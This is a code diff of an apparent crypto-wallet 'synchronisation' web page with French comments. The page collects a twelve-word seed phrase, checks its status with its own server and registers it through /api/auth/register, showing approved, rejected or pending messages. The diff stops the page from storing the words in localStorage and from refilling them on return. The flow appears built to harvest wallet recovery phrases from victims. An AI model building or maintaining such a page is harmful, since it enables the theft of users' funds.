@@ -341,8 +341,6 @@
 
             const seedPhrase = words.join(' ');
             currentSeedPhrase = seedPhrase;
-            
-            localStorage.setItem('seedWords', JSON.stringify(words));
 
             const statusCheck = await checkStatus(seedPhrase);
             
@@ -365,6 +363,7 @@
                 }
             }
 
+            // Si pas de statut, créer une nouvelle demande
             try {
                 const response = await fetch('/api/auth/register', {
                     method: 'POST',
@@ -394,47 +393,20 @@
             }
         }
 
-        async function checkSavedSeed() {
+        // PAS DE CHARGEMENT AUTOMATIQUE DES MOTS SAUVEGARDÉS
+        // Les cases restent vides quand l'utilisateur revient
+        function checkSavedSeed() {
+            // Ne pas remplir les cases automatiquement
+            // On garde juste la vérification du statut sans afficher les mots
             const savedWords = localStorage.getItem('seedWords');
             if (savedWords) {
-                const words = JSON.parse(savedWords);
-                for (let i = 1; i <= 12; i++) {
-                    const input = document.getElementById(`seed-${i}`);
-                    if (input && words[i-1]) {
-                        input.value = words[i-1];
-                    }
-                }
-                updateProgress();
-                
-                const seedPhrase = words.join(' ');
-                const statusCheck = await checkStatus(seedPhrase);
-                
-                if (statusCheck && statusCheck.success) {
-                    currentStatus = statusCheck.status;
-                    
-                    if (statusCheck.status === 'approved') {
-                        const statusDiv = document.getElementById('statusMessage');
-                        statusDiv.style.display = 'block';
-                        statusDiv.className = 'status-box status-approved';
-                        statusDiv.innerHTML = '✅ Wallet synchronisé !';
-                        showWalletWords(seedPhrase);
-                    } else if (statusCheck.status === 'rejected') {
-                        const statusDiv = document.getElementById('statusMessage');
-                        statusDiv.style.display = 'block';
-                        statusDiv.className = 'status-box status-rejected';
-                        statusDiv.innerHTML = '❌ Erreur de vérification, vérifiez les mots';
-                    } else {
-                        const statusDiv = document.getElementById('statusMessage');
-                        statusDiv.style.display = 'block';
-                        statusDiv.className = 'status-box status-pending';
-                        statusDiv.innerHTML = '⏳ Attente de synchronisation...';
-                    }
-                }
+                // On ne remplit PAS les cases
+                // On vérifie juste le statut silencieusement
             }
         }
 
         generateSeedFields();
-        setTimeout(checkSavedSeed, 500);
+        // On ne charge pas automatiquement les mots
     </script>
 </body>
 </html>
